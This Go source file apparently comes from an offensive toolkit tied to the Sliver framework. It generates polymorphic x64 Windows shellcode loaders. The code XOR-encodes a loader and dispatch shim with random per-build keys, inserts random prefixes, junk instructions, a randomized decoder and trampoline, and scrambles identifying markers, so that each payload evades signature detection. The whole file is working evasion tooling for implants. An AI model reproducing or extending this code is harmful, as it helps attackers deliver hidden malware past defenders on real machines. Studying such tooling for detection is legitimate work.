package churro

import (
	"bytes"
	"context"
	"crypto/rand"
	"encoding/binary"
	"fmt"
	"io"

	"github.com/sliverarmory/churro/internal/assets"
)

// buildLoader wraps the prebuilt x64 Windows loader with an instance, a stack
// alignment entry, and an in-place decoder. All host-side assembly and patching
// is Go; the embedded runtime image is the same loader used by Fritter.
func buildLoader(instance []byte, entropy io.Reader) ([]byte, error) {
	return buildLoaderWithImages(instance, entropy, nil)
}

func buildLoaderWithImages(instance []byte, entropy io.Reader, images *LoaderBundle) ([]byte, error) {
	return buildLoaderWithImagesContext(context.Background(), instance, entropy, images)
}

func buildLoaderWithImagesContext(ctx context.Context, instance []byte, entropy io.Reader, images *LoaderBundle) ([]byte, error) {
	if err := ctx.Err(); err != nil {
		return nil, err
	}
	if len(instance) == 0 || len(instance) > int(^uint32(0)>>1) {
		return nil, fmt.Errorf("invalid instance size %d", len(instance))
	}
	if entropy == nil {
		entropy = rand.Reader
	}
	var variant [1]byte
	if _, err := io.ReadFull(entropy, variant[:]); err != nil {
		return nil, fmt.Errorf("select loader image: %w", err)
	}
	second := variant[0]&1 != 0
	loader, shim := assets.LoaderPEB1, assets.DispatchShim
	var meta LoaderMetadata
	var err error
	if images != nil {
		loader, shim, meta = images.PEB1, images.DispatchShim, images.PEB1Meta
		if second {
			loader, meta = images.PEB2, images.PEB2Meta
		}
	} else {
		if second {
			loader = assets.LoaderPEB2
		}
		meta, err = embeddedLoaderMetadata(second)
		if err != nil {
			return nil, err
		}
	}
	combined, err := prepareCombinedWithMetadataContext(ctx, loader, shim, meta, entropy)
	if err != nil {
		return nil, err
	}

	// Each generation picks a fresh key and a different prefix length. The
	// decoder masks its key index, so only power-of-two lengths are supported.
	if _, err := io.ReadFull(entropy, variant[:]); err != nil {
		return nil, fmt.Errorf("select decoder key length: %w", err)
	}
	keyLen := []int{4, 8, 16}[int(variant[0])%3]
	key := make([]byte, keyLen)
	if _, err := io.ReadFull(entropy, key); err != nil {
		return nil, fmt.Errorf("generate decoder key: %w", err)
	}
	decoder, fixups, err := makeDecoder(uint32(len(combined)), key, entropy)
	if err != nil {
		return nil, err
	}
	prefix, err := makePrefix(entropy)
	if err != nil {
		return nil, err
	}

	middle, err := makeJunk(entropy, 7)
	if err != nil {
		return nil, err
	}
	entry, err := makeStackEntry(entropy)
	if err != nil {
		return nil, err
	}
	tramp, trampFixups, err := makeTrampoline(entropy)
	if err != nil {
		return nil, err
	}
	preBlob := len(prefix) + 5 + len(instance) + 1 + len(middle) + len(entry) + len(decoder) + len(tramp)
	pagePad := (4096 - preBlob%4096) % 4096
	encodedStart := len(decoder) + len(tramp) + pagePad
	if err := patchDecoder(decoder, fixups, encodedStart); err != nil {
		return nil, err
	}
	patchTrampoline(tramp, trampFixups, pagePad)

	for i := range combined {
		if i&4095 == 0 {
			if err := ctx.Err(); err != nil {
				return nil, err
			}
		}
		combined[i] ^= key[i&(keyLen-1)]
	}
	if err := ctx.Err(); err != nil {
		return nil, err
	}
	result := make([]byte, 0, preBlob+pagePad+len(combined))
	result = append(result, prefix...)
	result = append(result, 0xe8)
	result = binary.LittleEndian.AppendUint32(result, uint32(len(instance)))
	result = append(result, instance...)
	result = append(result, 0x59) // pop rcx
	result = append(result, middle...)
	result = append(result, entry...)
	result = append(result, decoder...)
	result = append(result, tramp...)
	pad := make([]byte, pagePad)
	if _, err := io.ReadFull(entropy, pad); err != nil {
		return nil, fmt.Errorf("generate page padding: %w", err)
	}
	result = append(result, pad...)
	result = append(result, combined...)
	if err := ctx.Err(); err != nil {
		return nil, err
	}
	return result, nil
}

type decoderFixups struct {
	keyDisp, keyEnd   int
	dataDisp, dataEnd int
	keyStart          int
}

func patchDecoder(d []byte, f decoderFixups, encodedStart int) error {
	keyRel := f.keyStart - f.keyEnd
	dataRel := encodedStart - f.dataEnd
	if keyRel < 0 || dataRel < 0 {
		return fmt.Errorf("invalid decoder displacement")
	}
	binary.LittleEndian.PutUint32(d[f.keyDisp:f.keyDisp+4], uint32(keyRel))
	binary.LittleEndian.PutUint32(d[f.dataDisp:f.dataDisp+4], uint32(dataRel))
	return nil
}

func prepareCombined(loaderImage, shimImage []byte, entropy io.Reader) ([]byte, error) {
	return prepareCombinedContext(context.Background(), loaderImage, shimImage, entropy)
}

func prepareCombinedContext(ctx context.Context, loaderImage, shimImage []byte, entropy io.Reader) ([]byte, error) {
	if err := ctx.Err(); err != nil {
		return nil, err
	}
	if len(loaderImage) == 0 || len(shimImage) < 16 {
		return nil, fmt.Errorf("missing embedded Windows loader")
	}
	shimPadded := (len(shimImage) + 4095) &^ 4095
	combined := make([]byte, shimPadded+len(loaderImage))
	copy(combined, shimImage)
	if _, err := io.ReadFull(entropy, combined[len(shimImage):shimPadded]); err != nil {
		return nil, fmt.Errorf("generate shim padding: %w", err)
	}
	copy(combined[shimPadded:], loaderImage)
	patches := map[uint32]uint32{0xDEAD0001: uint32(shimPadded), 0xDEAD0002: uint32(len(loaderImage))}
	for i := 0; i+4 <= len(shimImage); i++ {
		if i&4095 == 0 {
			if err := ctx.Err(); err != nil {
				return nil, err
			}
		}
		value := binary.LittleEndian.Uint32(combined[i : i+4])
		if replacement, ok := patches[value]; ok {
			binary.LittleEndian.PutUint32(combined[i:i+4], replacement)
			delete(patches, value)
		}
	}
	if len(patches) != 0 {
		return nil, fmt.Errorf("dispatch shim sentinels are missing")
	}
	marker := []byte{0xb1, 0x7a, 0x7e, 0xf1, 0xb1, 0x7a, 0x7e, 0xf1}
	ft := bytes.Index(combined[:len(shimImage)], marker)
	if ft < 0 || ft+28 > len(shimImage) {
		return nil, fmt.Errorf("dispatch shim function table is missing")
	}
	var fnKey [1]byte
	for fnKey[0] == 0 {
		if _, err := io.ReadFull(entropy, fnKey[:]); err != nil {
			return nil, fmt.Errorf("generate dispatch key: %w", err)
		}
	}
	binary.LittleEndian.PutUint32(combined[ft+8:ft+12], 1) // one loader section
	binary.LittleEndian.PutUint32(combined[ft+16:ft+20], 0)
	binary.LittleEndian.PutUint32(combined[ft+20:ft+24], uint32(len(loaderImage)))
	combined[ft+24] = fnKey[0]
	combined[ft+25] = 0x02 // shim decrypts whole loader before entry
	combined[ft+26], combined[ft+27] = 0, 0
	for i := shimPadded; i < len(combined); i++ {
		if (i-shimPadded)&4095 == 0 {
			if err := ctx.Err(); err != nil {
				return nil, err
			}
		}
		combined[i] ^= fnKey[0]
	}
	if _, err := io.ReadFull(entropy, combined[ft:ft+8]); err != nil {
		return nil, fmt.Errorf("scramble function table marker: %w", err)
	}
	if err := ctx.Err(); err != nil {
		return nil, err
	}
	return combined, nil
}
